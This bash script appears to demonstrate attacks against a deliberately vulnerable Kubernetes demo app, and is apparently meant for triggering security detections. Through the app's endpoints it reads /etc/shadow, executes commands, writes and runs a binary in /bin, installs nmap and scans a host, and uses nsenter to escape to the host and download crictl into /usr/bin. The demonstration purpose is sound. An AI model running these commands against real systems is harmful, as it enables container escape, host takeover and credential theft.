#!/usr/bin/env bash
# Script to demonstrate how to interact with security-playground

LOAD_BALANCER_URL=$(kubectl get svc playground -n default -o json | jq -r .status.loadBalancer.ingress[].ip)
PORT=80

echo "Target: $LOAD_BALANCER_URL:$PORT"

# Try to reach hello-server for our NetworkPolicy example later
#curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d "command=curl https://hello-server.event-generator.svc:8080" > /dev/null

echo "1. Read a sensitive file (/etc/shadow)"
echo "--------------------------------------------------------------------------------"
curl $LOAD_BALANCER_URL:$PORT/etc/shadow
echo "--------------------------------------------------------------------------------"
sleep 10

echo "2. Explore container folders"
echo "--------------------------------------------------------------------------------"
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=ls -la'
echo "--------------------------------------------------------------------------------"
sleep 10

echo "3. Write to /bin"
echo "--------------------------------------------------------------------------------"
curl -X POST $LOAD_BALANCER_URL:$PORT/bin/hello -d 'content=echo "hello-world"'
echo ""
echo "and then set it to be executable"
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=chmod 0755 /bin/hello'
echo "and then run it"
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=hello'
echo "--------------------------------------------------------------------------------"
sleep 10

echo "4. Install nmap from apt and then run a scan"
echo "--------------------------------------------------------------------------------"
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=apt-get update; apt-get -y install nmap;nmap -v scanme.nmap.org'
echo "--------------------------------------------------------------------------------"
sleep 10

echo "5. Break out of our Linux namespace to the host's with nsenter and install crictl in /usr/bin"
echo "--------------------------------------------------------------------------------"
ARCH=$(curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=dpkg --print-architecture')
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d "command=nsenter --all --target=1 wget -q https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.27.1/crictl-v1.27.1-linux-$ARCH.tar.gz"
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d "command=nsenter --all --target=1 tar -zxvf crictl-v1.27.1-linux-$ARCH.tar.gz -C /usr/bin"
echo "--------------------------------------------------------------------------------"
sleep 10
